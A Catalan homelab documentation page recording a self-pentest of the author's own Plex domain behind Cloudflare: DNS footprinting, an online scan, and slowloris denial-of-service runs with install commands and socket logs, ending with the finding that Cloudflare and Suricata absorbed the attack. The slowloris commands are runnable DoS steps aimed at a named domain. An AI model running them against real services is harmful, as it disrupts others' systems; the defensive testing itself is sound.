---
layout: default
title: Pentesting
has_children: true
parent: Exposem serveis a Internet
nav_order: 5
---
# Atacant el nostre servei web
## Footprinting
Començarem a intentar recollir dades sobre el servei web. El primer de tot, serà intentar treure direccions IP, rangs, SA, i tot el que ens pugui donar informació sobre com està desplegada la pàgina web.

Un simple nslookup al nostre domini, ```plex.espardenya.me``` ja ens començarà a donar informació sobre el servei.

```bash
#Informació sobre la xarxa des d'on recabam dades
Servidor:  hamm.espardenya.local
Address:  10.0.74.1
#Informació sobre el host analitzat
Respuesta no autoritativa:
Nombre:  plex.espardenya.me
Addresses:  2a06:98c1:3121::5
          2a06:98c1:3120::5
          188.114.96.5
          188.114.97.5
```
Segons NSLookup, tenim aquests rangs en l'espai IPv6 i IPv4. Una cerca ràpida sobre aquestes direccions IP ens indicarà que el nostre servei web està baix el reverse proxy de Cloudflare. 

> ### Llistat de direccions IPv4 de [Cloudflare](https://www.cloudflare.com/ips-v4)
> ```
> 173.245.48.0/20
> 103.21.244.0/22
> 103.22.200.0/22
> 103.31.4.0/22
> 141.101.64.0/18
> 108.162.192.0/18
> 190.93.240.0/20
> 188.114.96.0/20
> 197.234.240.0/22
> 198.41.128.0/17
> 162.158.0.0/15
> 104.16.0.0/13
> 104.24.0.0/14
> 172.64.0.0/13
> 131.0.72.0/22
> ```
> La nostra IP està al bloc 188.114.96.0/20

Podem intentar obrir una connexió a la direcció directament mitjançant curl.

```bash
curl 188.114.96.5
error code: 1003
```

Ens indica que necessita headers que especifiquin un nom de domini, per aquí no podrem accedir enlloc.

## Fingerprinting

Accedim a la pàgina web [Pentest-Tools](https://pentest-tools.com/website-vulnerability-scanning/website-scanner) per a veure possibles vulnerabilitats al nostre servidor web.

Escanejant el subdomini ```plex.espardenya.me``` ens trobarem la seguent informació.
<img src="..\assets\images\pentesting\cloudflare\pentestingtools1.png" alt="Bloqueig direccions IP Suricata " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>
<img src="..\assets\images\pentesting\cloudflare\pentestingtools2.png" alt="Bloqueig direccions IP Suricata " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>

> Nota: Això ens confirma que les proteccions dels HTTP headers que vam aplicar a Caddy (les podem trobar [aquí.](link) són efectives.)

## Explotació

Durem a terme l'explotació dels serveis web mitjançant atacs slowloris i . També comprovarem l'efectivitat de les eines Under-Attack Mode de Cloudflare.

### Slowloris - Mode Estàndard
Anem a provar a atacar el nostre servei web mitjançant un atac slowloris. Emprarem l'eina que podem trobar [a Github](https://github.com/gkbrk/slowloris), i executarem l'atac seguint les instruccions del readme del mateix repositori.

Instal·larem el programa mitjançant el gestor de paquets pip3 i executarem el programa.

```bash
sudo pip3 install slowloris
slowloris plex.espardenya.me
```

Podem provar de fer un slowloris estàndard. Per defecte, enviarem 150 sockets al servidor. Al poc temps, ens ha aparegut una alerta a Suricata que ens ha bloquejat una direcció IP. No podem comprovar que aquest bloqueig sigui degut a aquest atac, però per hores podria quadrar.
```bash
[sirazazel@buzz ~]$ slowloris plex.espardenya.me
[04-08-2022 14:11:51] Attacking plex.espardenya.me with 150 sockets.
[04-08-2022 14:11:51] Creating sockets...
[04-08-2022 14:11:57] Sending keep-alive headers... Socket count: 150
[04-08-2022 14:12:12] Sending keep-alive headers... Socket count: 150
[04-08-2022 14:12:32] Sending keep-alive headers... Socket count: 150
[04-08-2022 14:12:52] Sending keep-alive headers... Socket count: 150
[04-08-2022 14:13:12] Sending keep-alive headers... Socket count: 150
```
<img src="..\assets\images\pentesting\cloudflare\slowloris_bloqueig_1.png" alt="Bloqueig direccions IP Suricata " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>

Anem a revisar les estadístiques de Cloudflare. Ens han arribat 135 requests noves des d'Espanya en les darreres hores.

<img src="..\assets\images\pentesting\cloudflare\requests_slowloris_1.png" alt="Bloqueig direccions IP Suricata " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>


Provarem augmentant la quantitat de sockets a 5000.

```bash
[sirazazel@buzz ~]$ slowloris plex.espardenya.me -s 5000
[04-08-2022 15:04:19] Attacking plex.espardenya.me with 5000 sockets.
[04-08-2022 15:04:19] Creating sockets...
[04-08-2022 15:04:39] Sending keep-alive headers... Socket count: 1020
[04-08-2022 15:04:59] Sending keep-alive headers... Socket count: 1020
[04-08-2022 15:05:35] Sending keep-alive headers... Socket count: 1020
[04-08-2022 15:06:11] Sending keep-alive headers... Socket count: 1020
[04-08-2022 15:06:46] Sending keep-alive headers... Socket count: 1020
[04-08-2022 15:07:22] Sending keep-alive headers... Socket count: 1020
[04-08-2022 15:07:58] Sending keep-alive headers... Socket count: 1020
```

El sistema automàticament ens ha limitat la quantitat de sockets a 1020. Al cap d'un temps, ens ha anat limitant la connexió.

```bash
[04-08-2022 15:20:40] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:20:55] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:21:10] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:21:25] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:21:40] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:21:55] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:22:10] Sending keep-alive headers... Socket count: 336
[04-08-2022 15:22:25] Sending keep-alive headers... Socket count: 336
```

A Cloudflare ens apareixen algunes requests noves (208) però no ens estàn arribant al Firewall.

<img src="..\assets\images\pentesting\cloudflare\slowloris_gran_1.png" alt="Alt número de requests a Cloudflare. " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>

<img src="..\assets\images\pentesting\cloudflare\slowloris_gran_2.png" alt="Tràfic normal a PFSense. " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>

El servei s'està ralentitzant, però segueix resolent sense problema. El servidor, però, no està rebent tràfic de manera excessisva. Hi ha tres picos de 500KiB que es corresponen amb els tres intents d'entrada al servei per la meva part, per tant, el bloqueig i ralentització s'estàn fent de part de Cloudflare.

El socket count dels atacs slow loris ha arribat a ser de menys de 6 sockets.

<img src="..\assets\images\pentesting\cloudflare\slowloris_gran_3.png" alt="Tràfic normal a PFSense. " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>

A la pàgina de Analytics > Security de Cloudflare ens apareixen 5 registres d'atacs, però cap d'ells som nosaltres, ja que no coincideix el header GeoIP.


<img src="..\assets\images\pentesting\cloudflare\cloudflare_threats2.png" alt="Tràfic normal a PFSense. " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>
<img src="..\assets\images\pentesting\cloudflare\cloudflare_threats1.png" alt="Tràfic normal a PFSense. " width="700" style="display: block; margin-left: auto; margin-right: auto;"/>

### Slowloris - Mode Under-Attack

El mode I'm Under Attack de Cloudflare afegeix una pàgina intermitja en la qual s'analitza el tràfic per a veure si és tràfic vàlid.

Anem a provar l'atac slowloris amb aquest mode activat.

Podem veure que amb curl ja no ens deixa accedir per què fallam el JS Challenge.
```html
<noscript>
    <div id="challenge-error-title">
        <div class="h2">
            <span class="icon-wrapper">
                <div class="heading-icon warning-icon"></div>
            </span>
            <span id="challenge-error-text">
                Enable JavaScript and cookies to continue
            </span>
        </div>
    </div>
</noscript>
```

L'atac slow loris ha tardat molt menys en reduïr-nos les connexions obertes.

```bash
└─$ python3 slowloris.py plex.espardenya.me -s 5000
[04-08-2022 17:38:38] Attacking plex.espardenya.me with 5000 sockets.
[04-08-2022 17:38:38] Creating sockets...
[04-08-2022 17:39:39] Sending keep-alive headers... Socket count: 1020
[04-08-2022 17:40:53] Sending keep-alive headers... Socket count: 1020
[04-08-2022 17:41:43] Sending keep-alive headers... Socket count: 337
[04-08-2022 17:43:38] Sending keep-alive headers... Socket count: 895
[04-08-2022 17:44:19] Sending keep-alive headers... Socket count: 340
[04-08-2022 17:45:47] Stopping Slowloris
```
El servei segueix resolent de manera ràpida (bé, amb el JS Challenge de Cloudflare abans de carregar.)

## Conclusió

Pràcticament, el tràfic maliciós no ha arribat al Firewall on-premise, així que el CDN de Cloudflare ha funcionat de manera correcta.